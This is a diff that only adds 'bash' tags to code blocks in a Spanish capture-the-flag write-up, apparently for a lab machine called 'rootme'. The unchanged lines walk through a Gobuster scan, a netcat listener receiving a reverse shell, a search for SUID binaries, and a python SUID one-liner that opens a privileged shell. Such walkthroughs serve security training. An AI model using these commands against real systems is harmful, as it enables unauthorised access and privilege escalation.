@@ -45,7 +45,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 ### Escaneo con Gobuster
 
-```
+```bash
 gobuster dir -u http://10.10.14.154 -w /usr/share/wordlists/wfuzz/general/common.txt -x html,php,txt
 ===============================================================
 Gobuster v3.6
@@ -79,7 +79,7 @@ Nos encontraremos con que no podemos subir archivos con extensión PHP, por lo t
 
 Una vez cargado lo ejecutaremos accediendo al directorio /uploads/, habiendonos puesto en escucha previamente por netcat.
 
-```
+```bash
 nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.9.1.219] from (UNKNOWN) [10.10.14.154] 51008
@@ -99,7 +99,7 @@ Para favorecer al tratamiento de la bash lanzaremos los siguientes comandos.
 
 Una vez establecida la conexión mediante la reverse shell ejecutaremos el siguiente comando para buscar la flag que nos solicitan
 
-```
+```bash
 www-data@rootme:/$ find / -type f -name "user.txt" 2>/dev/null
 find / -type f -name "user.txt" 2>/dev/null
 /var/www/user.txt
@@ -109,7 +109,7 @@ www-data@rootme:/$
 
 Para ello buscaremos aquellos binarios que tengan el SUID activado, estos archivos se ejecutan con los permisos del propietario (normalmente root), sin importar quién los ejecute.
 
-```
+```bash
 www-data@rootme:/$ find -perm -4000 2>/dev/null
 find -perm -4000 2>/dev/null
 ./usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -134,7 +134,7 @@ find -perm -4000 2>/dev/null
 ```
 Si buscamos en GTFOBins veremos que el binario de python es vulnerable a SUID
 
-```
+```bash
 install -m =xs $(which python) .
 /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
